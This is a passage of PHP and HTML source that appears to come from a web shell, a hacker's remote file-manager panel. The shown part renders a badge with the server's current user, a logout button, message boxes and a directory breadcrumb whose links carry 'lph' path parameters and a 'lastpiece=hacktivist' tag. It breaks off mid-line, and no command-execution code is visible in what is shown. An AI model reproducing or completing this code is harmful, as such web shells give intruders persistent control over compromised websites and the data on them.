  <span class="sys-badge"><?php echo @get_current_user(); ?></span>
        <form method="POST" style="display:inline;"><button type="submit" name="logout" class="btn btn-danger btn-sm">Logout</button></form>
    </div>
</header>

<div class="container">
    <?php if (!empty($responseMessage)): ?><div class="msg-success"><?php echo $responseMessage; ?></div><?php endif; ?>
    <?php if (!empty($errorMessage)): ?><div class="msg-error"><?php echo $errorMessage; ?></div><?php endif; ?>

    <div class="breadcrumb">
        <strong>DIR:</strong>
        <?php
        $bPath = str_replace('\\', '/', $currentDirectory);
        $parts = explode('/', $bPath);
        foreach ($parts as $id => $part) {
            if ($part == '' && $id == 0) {
                echo ' <a href="?lph=/&lastpiece=hacktivist">/</a>';
            } elseif (!empty($part)) {
                $link = implode('/', array_slice($parts, 0, $id + 1));
                echo ' <a href="?lph=' . urlencode($link) . '&lastpiece=h